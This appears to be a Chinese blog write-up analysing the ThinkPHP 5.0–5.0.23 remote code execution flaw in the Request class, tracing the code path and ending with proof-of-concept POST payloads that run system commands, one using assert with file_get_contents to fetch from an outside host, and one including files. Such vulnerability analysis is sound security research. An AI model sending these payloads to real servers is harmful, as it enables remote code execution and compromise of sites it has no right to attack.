---
layout: post
title: ThinkPHP5 RCE
tags: [PHP, ThinkPHP5]
comment: false
---

主要成因为框架中的核心类 Request 中存在调用任意（其实不能算是任意）方法的点，通过构造可以做成 RCE。

这是 ThinkPHP 最近出的第二个影响比较大的 RCE 了，虽然对 ThinkPHP 不熟悉，不过这个洞的成因和利用还是比较有意思的，再加上已经好久没去分析 PHP 方面的漏洞了，写下分析当个记录了。全程是根据别人的分析静态跟代码加上在环境上测试完成的，没有做动态跟踪（懒得去弄了）。

## 0x00 影响版本
5.0 - 5.0.23

## 0x01 漏洞分析及利用构造
进入到漏洞关键点的执行流程：
think\App#run --> think\App#routeCheck --> think\Route#check --> think\Request#method

think\Request#method 具体代码如下
![](https://i.loli.net/2019/07/28/5d3d4ff3a809a84077.jpg)

在前面的执行流程中调用到 method 方法的时候是不带参数的，所以这里的形参 $method 的实际值为 false，另外 Config::get('var_method') 的值来自于 convention.php 默认为 _method。虽然这里会把字符串变成大写，但是在 PHP 中方法名大小写不敏感，因此在图中的红框处就能实现 Request 中任意方法的调用（当然了得参数类型符合）。

这里选择的类 Request 中的方法为其构造方法，具体代码如下
![](https://i.loli.net/2019/07/28/5d3d4ff434b5d96219.jpg)

选择这个方法主要是为了覆盖类 Request 中的成员变量的值，为后面的利用做准备。

再看 think\Request#param
![](https://i.loli.net/2019/07/28/5d3d4ff71b8a875794.jpg)

当 mergeParam 为空时会调用到 get 方法，其实这里在执行 $this->method(true) 一样会调用到下面说的 input 方法，这里就跟下 get。跟进 think\Request#get
![](https://i.loli.net/2019/07/28/5d3d4ff57604131870.jpg)

继续跟进 think\Request#input
![](https://i.loli.net/2019/07/28/5d3d4ffc25f3461402.jpg)

data 的值来自 Request 中的 get（数组），所以会调用到 array_walk_recursive 函数，而这个函数设置的 callback 函数为 filterValue。漏洞的利用点就在 filterValue 中，其代码如下
![](https://i.loli.net/2019/07/28/5d3d4ffb5779269155.jpg)

主要就是用 call_user_func 来做成 RCE，因此 filter 和 value 的值需要可控，顺着调用流程往回看和结合前面提到的在构造方法中做覆盖的方法就能知道怎么去控制这两个变量的值。结合前面提到的 value 的值其实就来自于 Request 类中的 get，再来看 filter，很明显能知道 filter 的值来自 getFilter 方法的执行结果，think\Request#getFilter
![](https://i.loli.net/2019/07/28/5d3d4ff8dbf5658046.jpg)

这个方法的代码逻辑比较简单的，要控制 filter 的值的话，就只需要在 POST 请求中传个 filter 的值就行了。到这里可以知道的了 PoC 中需要构造的请求如下

```
POST
_method=__construct&mergeParam&=filter=system&get[]=id
```

接下来只要找到办法调用 think\Request#param 就可以完成整个利用了。think\App#run 中存在如下代码
![](https://i.loli.net/2019/07/28/5d3d4ffc6e19e95420.jpg)

所以要是在开启了调试模式的情况下用前面的构造好的请求就可以完成利用了，但是 23 版本在默认情况下是没有开启调试模式的，再看下在没有开启调试模式的情况下如何利用。

回看 think\Route#check 中调用 think\Request#method 往后的代码
![](https://i.loli.net/2019/07/28/5d3d500ac520669420.jpg)

这里的 method 的值其实就来自于 Request 类中的 method，因此可控。往下就是根据 method 的值来获取路由规则，这里需要用到验证码类（只在完整版中有，核心版中没有）中的一个路由规则，规则如下
![](https://i.loli.net/2019/07/28/5d3d50075e4fa55273.jpg)

所以要是想获取到这个路由规则就得传参 s=captcha 来完成类的自动加载同时设置 method 的值为 get。这里获取这个路由规则的主要目的是为了完成漏洞的利用，往下跟就明白了。接下来的执行流程为 think\Route#checkRoute --> think\Route#checkRule --> think\Route#parseRule

parseRule 方法中的部分代码
![](https://i.loli.net/2019/07/28/5d3d500b7f0ef71486.jpg)

这里主要是根据路由规则的格式返回不同的结果，这里返回的结果中 type 为 method。结果返回赋值给 think\App 类中的 dispatch。往下跟进 think\App#exec
![](https://i.loli.net/2019/07/28/5d3d500eb615074412.jpg)

可以看到这里就能成功调用到了漏洞利用需要的 param 方法。

## 0x02 PoC
开启调试模式

```
POST /index.php
_method=__construct&filter=system&get[]=id
```

关闭调试模式

```
POST /index.php?s=captcha
_method=__construct&filter=system&get[]=id&method=get
```

另外一种控制 value 的方法

```
_method=__construct&filter=system&server[REQUEST_METHOD]=id&method=get
```

```
_method=__construct&filter=assert&server[HTTP_HOST]=file_get_contents('http://x.x.x.x/tp');
```

包含文件
```
_method=__construct&method=get&filter[]=think\__include_file&server[]=phpinfo&get[]=/tmp/xx
```
## 0x03 参考
- 一份漏洞分析文档
- [启明星辰ADLab：ThinkPHP5核心类Request远程代码漏洞分析](https://mp.weixin.qq.com/s/DGWuSdB2DvJszom0C_dkoQ)

